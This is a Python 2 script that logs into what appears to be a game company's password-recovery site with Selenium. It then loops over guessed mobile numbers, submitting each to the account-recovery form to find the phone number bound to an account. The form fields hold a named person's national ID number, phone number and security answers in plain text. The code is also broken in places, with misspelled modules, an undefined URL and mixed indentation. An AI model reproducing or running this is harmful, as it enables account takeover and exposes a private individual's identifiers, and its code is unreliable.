# coding:utf8
import random
import urllib2
import urllib
import Queue
import threading
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from lists import lists
import ssl

context = ssl._create_univerified_context()

driver = webdriver.PhantomJS()
driver.get("http://pwd.dobest.cn/")
# 输入账号密码
driver.find_element_by_name("passport").send_keys("13991922468")
driver.save_screenshot("douban1.png")

#请输入验证码
yanzhengma = raw_input("请输入验证码:")
driver.find_element_by_name("captcha").send_keys(yanzhengma)

# 模拟点击登录
driver.find_element_by_xpath("//div/button[@type='submit']").click()
driver.save_screenshot("douban2.png")
print "登陆成功",driver.current_url
# driver.get("http://pwd.dobest.cn/question")
# driver.find_element_by_name("regname").send_keys("翟乐乐")
# driver.find_element_by_name("regidcard").send_keys("610323199305166817")
# driver.find_element_by_name("regmobile").send_keys("18300668073")
# driver.find_element_by_name("bindmobile").send_keys(number)
list_cookies = driver.get_cookies() 
number = Queue.Queue()

for i in range(len(lists)):
    for j in range(0,10):
    	#取到所有匹配的手机号
        iphone = random.choice(lists) + str(i) + str(706)
        number.put(iphone)


def crawl():
	
	while not number.empty():
	    num = number.get()
		formdata={
			"_token":"CqgWrNn6mZZ9MqoIPO2UrDsy8E1IOlmYB1qMb1YO",
			"regname":"翟乐乐",
			"regbirthday":"",	
			"regidcard":"610323199305166817",
			"regtel":"",	
			"regmobile":"18300668073",
			"bindmobile":number,
			"regemail":"",	
			"regquestion1":"我的小学名字？",
			"reganswer1":"小学",
			"regquestion2":"我的学号（或工号）是？",
			"reganswer2":"0205",
			}

		headers = {
			"Connection":" keep-alive",
			"Content-Length":" 424",
			"Cache-Control":" max-age=0",
			"Upgrade-Insecure-Requests":" 1",
			"Content-Type":" application/x-www-form-urlencoded",
			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
			"Cookie": list_cookies}

		data = urllib.urlencode(formdata)
		print number
		request = urllib2.Request(url,data=data,headers=headers)
		print urlib2.urlopen(request,context=context).read()


if __name__ == "__main__":
	crawl()

